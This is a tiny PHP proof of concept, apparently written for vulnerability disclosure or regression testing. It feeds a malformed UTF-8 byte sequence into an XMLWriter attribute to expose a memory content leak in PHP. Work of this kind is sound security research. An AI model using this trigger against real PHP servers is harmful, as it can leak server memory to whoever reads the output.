<?php 
# Copyright 2010, Canonical, Ltd. 
# Author: Kees Cook <kees@ubuntu.com> 
# License: GPLv3 
# 
# Proof-of-concept memory content leak 

$xw = new XMLWriter(); 
$xw->openURI('php://output'); 

$xw->startElement('input'); 
$xw->writeAttribute('value', "\xe0\x81"); 
$xw->endElement(); 

?>